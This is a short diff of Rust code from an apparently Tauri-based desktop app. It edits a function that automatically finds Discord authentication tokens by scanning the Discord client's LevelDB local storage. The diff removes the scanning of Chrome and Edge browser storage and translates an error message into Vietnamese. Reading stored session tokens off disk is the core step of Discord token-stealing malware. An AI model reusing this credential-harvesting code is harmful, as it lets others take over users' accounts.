@@ -429,12 +429,6 @@ async fn auto_detect_discord_token() -> Result<String, String> {
         scan_dir_for_tokens(&root.join("discordptb").join("Local Storage").join("leveldb"), &mut candidates);
     }
 
-    if let Ok(localappdata) = env::var("LOCALAPPDATA") {
-        let root = Path::new(&localappdata);
-        scan_dir_for_tokens(&root.join("Google").join("Chrome").join("User Data").join("Default").join("Local Storage").join("leveldb"), &mut candidates);
-        scan_dir_for_tokens(&root.join("Microsoft").join("Edge").join("User Data").join("Default").join("Local Storage").join("leveldb"), &mut candidates);
-    }
-
     let client = tauri_plugin_http::reqwest::Client::new();
 
     for token in candidates {
@@ -451,7 +445,7 @@ async fn auto_detect_discord_token() -> Result<String, String> {
         }
     }
 
-    Err("No active Discord account found on local app or browser.".to_string())
+    Err("Không tìm thấy tài khoản Discord Desktop App đang hoạt động trên máy tính.".to_string())
 }
 
 #[tauri::command(rename_all = "snake_case")]
